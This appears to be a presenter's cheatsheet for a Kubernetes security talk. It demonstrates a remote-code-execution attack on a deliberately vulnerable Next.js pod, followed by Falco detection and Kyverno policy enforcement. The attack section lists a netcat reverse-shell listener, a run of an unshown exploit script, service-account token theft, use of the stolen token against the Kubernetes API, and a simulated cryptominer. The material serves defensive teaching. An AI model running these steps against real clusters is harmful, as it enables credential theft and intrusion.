# Demo Day Cheatsheet

# KubeCon India 2026 — Keep this open during the talk

---

```bash
# verify everything is running
kubectl get nodes
kubectl get pods -n demo
kubectl get pods -n falco
kubectl get pods -n kyverno
kubectl get clusterpolicy

# verify app is reachable
curl -s http://$(hostname -I | awk '{print $1}'):30080 | grep "Contact Us"

# verify exploit script works
python3 exploit.py --help 2>/dev/null || echo "exploit.py ready"
```

---

## The 4-terminal setup

Open 4 terminals before starting the demo.

Terminal 1 — Falco live alerts:
```bash
kubectl logs -f -n falco -l app.kubernetes.io/name=falco -c falco --since=10s
```

Terminal 2 — Falco UI (open http://YOUR_EC2_PUBLIC_IP:2802 in browser):
```bash
kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802:2802 --address 0.0.0.0
```

Terminal 3 — Reverse shell listener:
```bash
nc -lvnp 4444 -s 0.0.0.0
```

Terminal 4 — Attack + kubectl commands:
```bash
# watch CPU
watch kubectl top pods -n demo
```

---

## Act 1: Fire the exploit

In Terminal 4:
```bash
python3 exploit.py 172.31.36.195 172.31.36.195
# press ENTER when prompted
```

Expected in Terminal 3:
```
Listening on 0.0.0.0 4444
Connection received on 10.42.x.x XXXXX   ← reverse shell landed!
```

---

## Act 2: Attacker commands inside the shell (Terminal 3)

```sh
# show you're inside the container as root
whoami
hostname
id

# steal the SA token — this is the Kubernetes API key
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# use stolen token to query k8s API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/demo/pods | grep '"name"'

# start cryptominer simulation
dd if=/dev/zero of=/dev/null &
dd if=/dev/zero of=/dev/null &
```

Switch to Terminal 4 — show CPU climbing:
```bash
watch kubectl top pods -n demo
# audience sees: 800m+ CPU with nothing to stop it
```

---

## Act 3: Falco catches everything (Terminal 1)

Expected alerts firing in order:
```
CRITICAL → Reverse Shell Detected           (shell spawned from node)
CRITICAL → Sensitive Token Read             (T1528 - cat token)
WARNING  → Unexpected Outbound Network Tool (T1105 - wget/curl)
CRITICAL → Cryptominer Process Detected     (dd if=/dev/zero)
```

Key line to say on stage:
"The moment that HTTP request landed, Falco knew —
 pod name, namespace, image, MITRE ATT&CK tag.
 Your SOC gets this alert in Slack within seconds."

---

## Act 4: Kyverno blocks bad pods

```bash
# all 3 should FAIL with clear human-readable error messages
kubectl apply -f manifests/kyverno/test-bad-no-limits.yaml
kubectl apply -f manifests/kyverno/test-bad-sa-token.yaml
kubectl apply -f manifests/kyverno/test-bad-privileged.yaml

# this one should SUCCEED
kubectl apply -f manifests/kyverno/test-good-pod.yaml
kubectl get pod good-pod -n demo
```

Key line to say on stage:
"Kyverno does not patch Next.js.
 It enforces guardrails so that even when an app is compromised,
 an attacker cannot deploy dangerous workloads into your cluster."

---

## Core message of the talk

"We did not stop the RCE.
 We stopped the RCE from becoming a cluster-wide disaster."

---

## Reset between runs

```bash
# stop miners, restart pod
kubectl rollout restart deployment/nextjs-vulnerable -n demo

# clean up test pods
kubectl delete pod bad-pod-no-limits bad-pod-sa-token \
  bad-pod-privileged good-pod -n demo --ignore-not-found

# restart nc listener
pkill nc && nc -lvnp 4444 -s 0.0.0.0
```

---

## If something breaks on stage

Pod not starting:
```bash
kubectl describe pod -n demo -l app=nextjs-vulnerable
```

Exploit not connecting:
```bash
# check nc is listening
ss -tlnp | grep 4444
# re-run with explicit IP
python3 exploit.py $(hostname -I | awk '{print $1}') $(hostname -I | awk '{print $1}')
```

Falco not showing alerts:
```bash
kubectl rollout restart daemonset/falco -n falco
kubectl logs -f -n falco -l app.kubernetes.io/name=falco -c falco --since=30s
```

Kyverno not blocking:
```bash
kubectl get clusterpolicy
# all should show READY: True
```